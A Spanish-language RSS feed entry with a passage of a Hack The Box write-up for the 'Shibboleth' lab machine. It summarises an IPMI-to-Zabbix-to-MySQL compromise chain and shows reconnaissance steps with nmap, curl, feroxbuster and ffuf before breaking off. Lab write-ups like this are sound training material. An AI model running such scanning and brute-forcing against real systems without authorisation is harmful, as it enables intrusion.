<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>ipmi on sckull</title>
    <link>https://sckull.github.io/tags/ipmi/</link>
    <description>Recent content in ipmi on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>¬©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 02 Apr 2022 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/ipmi/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Shibboleth</title>
        <link>https://sckull.github.io/posts/shibboleth/</link>
        <pubDate>Sat, 02 Apr 2022 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 Apr 2022 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/shibboleth/</guid>
        <description>Shibboleth expone IPMI por donde obtuvimos un hash que nos permiti√≥ acceder al panel de Zabbix, en este √∫ltimo logramos ejecutar commandos y acceder a la m√°quina.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Shibboleth expone IPMI por donde obtuvimos un hash que nos permiti√≥ acceder al panel de Zabbix, en este √∫ltimo logramos ejecutar commandos y acceder a la m√°quina. Reutilizando una contrase√±a nos dio acceso a un segundo usuario. Finalmente explotamos una vulnerabilidad en MySQL lo que nos permiti√≥ escalar privilegios.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/410&#34;&gt;Shibboleth&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;os_type&#34;&gt; Linux &lt;img src=&#34;https://sckull.github.io/images/icons/linux.png&#34; class=&#34;img_type_os&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.11.124&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8930&#34;&gt;knightmare&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/8930&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker2&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2984&#34;&gt;mrb3n&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/2984&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.6, 6, 5.9, 4.1, 4],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[9, 10, 9, 1, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;Nmap muestra unicamente el puerto http (80) abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ports=$(nmap -Pn -p- --min-rate=3000 10.10.11.124 | grep &amp;#39;^[0-9]&amp;#39; | cut -d &amp;#39;/&amp;#39; -f 1 | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed s/,$//)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# nmap -p$ports -sC -sV 10.10.11.124 -o nmap&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Thu Nov 25 01:09:55 2021 as: nmap -p80 -sC -sV -o nmap 10.10.11.124&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; shibboleth.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.124&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.44s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: FlexStart Bootstrap Template - Index

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Nov 25 01:10:09 2021 -- 1 IP address (1 host up) scanned in 14.45 seconds&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Tras realizar una solicitud en el puerto 80 nos redirige a un dominio: &lt;code&gt;shibboleth.htb&lt;/code&gt;, el cual agregamos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ curl -sI 10.10.11.124
HTTP/1.1 &lt;span class=&#34;m&#34;&gt;302&lt;/span&gt; Found
Date: Thu, &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 01:31:21 GMT
Server: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Location: http://shibboleth.htb/
Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1

 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al visitar el sitio web vemos una plantilla estatica donde no se muestra mucha informacion, el formulario al final de la pagina no parece funcionar y, con el error que muestra logramos obtener el codigo fuente de esta plantilla en &lt;a href=&#34;https://bootstrapmade.com/flexstart-bootstrap-startup-template/&#34;&gt;bootstrapmade&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_shibboleth_web.jpg&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el footer de la pagina vemos que mencionan &lt;code&gt;Zabbix &amp;amp; Bare Metal BMC automation&lt;/code&gt;, probablemente exista Zabbix y algun tipo de sistema para automatizar procesos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_20211124_192042.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;directory-brute-forcing&#34;&gt;Directory Brute Forcing&lt;/h2&gt;
&lt;p&gt;Tras ejecutar feroxbuster no se mostr√≥ ningun tipo de directorio en relacion a lo mencionado en el footer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ feroxbuster -u http://shibboleth.htb/ -w &lt;span class=&#34;nv&#34;&gt;$MD&lt;/span&gt; -x php -d &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher ü§ì                 ver: 2.3.3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://shibboleth.htb/
 üöÄ  Threads               ‚îÇ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 üìñ  Wordlist              ‚îÇ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405, 500&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üí•  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        ‚îÇ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.3.3
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üí≤  Extensions            ‚îÇ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;php&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 üîÉ  Recursion Depth       ‚îÇ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      317c http://shibboleth.htb/assets
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      321c http://shibboleth.htb/assets/img
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      316c http://shibboleth.htb/forms
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      321c http://shibboleth.htb/assets/css
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        1l        8w       44c http://shibboleth.htb/forms/contact.php
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      320c http://shibboleth.htb/assets/js
&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        9l       28w      324c http://shibboleth.htb/assets/vendor
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;subdominios&#34;&gt;Subdominios&lt;/h2&gt;
&lt;p&gt;Utilizando ffuf logramos enumerar tres subdominios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
